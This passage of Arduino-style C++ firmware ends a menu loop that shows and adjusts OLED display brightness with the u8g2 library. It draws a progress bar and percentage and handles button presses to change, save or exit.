        u8g2.drawStr(40, 10, "BRIGHTNESS");
        u8g2.drawFrame(8, 32, 112, 12);
        u8g2.drawBox(8, 32, contrast * 112 / 255, 12);
        char buf[8];
        sprintf(buf, "%d%%", contrast * 100 / 255);
        int w = u8g2.getStrWidth(buf);
        u8g2.drawStr((128 - w) / 2, 52, buf);
        u8g2.drawStr(8, 30, "<");
        u8g2.drawStr(110, 30, ">");
        u8g2.drawStr(2, 62, "LR=change OK=save BACK=exit");
        u8g2.sendBuffer();
        
        if (checkButton(BTN_LEFT) && contrast > 10) contrast -= 10;
        else if (checkButton(BTN_RIGHT) && contrast < 255) contrast += 10;
        else if (checkButton(BTN_OK)) { u8g2.setContrast(contrast); showSuccess("SAVED!", ""); break; }
        else if (checkButton(BTN_BACK)) break;
        delay(50);
    }
}

